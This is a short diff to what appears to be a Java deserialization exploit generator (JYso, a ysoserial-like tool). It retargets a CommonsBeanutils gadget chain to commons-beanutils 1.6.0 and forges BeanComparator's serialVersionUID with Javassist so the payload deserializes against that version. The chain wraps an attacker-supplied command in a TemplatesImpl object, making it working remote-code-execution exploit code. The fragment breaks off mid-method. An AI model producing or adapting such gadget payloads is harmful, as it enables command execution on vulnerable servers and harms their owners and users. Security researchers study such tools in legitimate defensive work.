@@ -12,17 +12,18 @@ import java.util.PriorityQueue;
 
 import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;
 
-@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
-public class CommonsBeanutils1183NOCC implements ObjectPayload<Object> {
+@Dependencies({"commons-beanutils:commons-beanutils:1.6.0"})
+public class CommonsBeanutils160 implements ObjectPayload<Object> {
 
     @Override
     public Object getObject(String command) throws Exception {
         final Object template;
         template = Gadgets.createTemplatesImpl(command);
+
         ClassPool pool    = ClassPool.getDefault();
         CtClass   ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
 
-        insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");
+        insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = 2573799559215537819;");
 
         Class                       beanCompareClazz = ctClass.toClass();
         BeanComparator              comparator       = (BeanComparator) beanCompareClazz.newInstance();
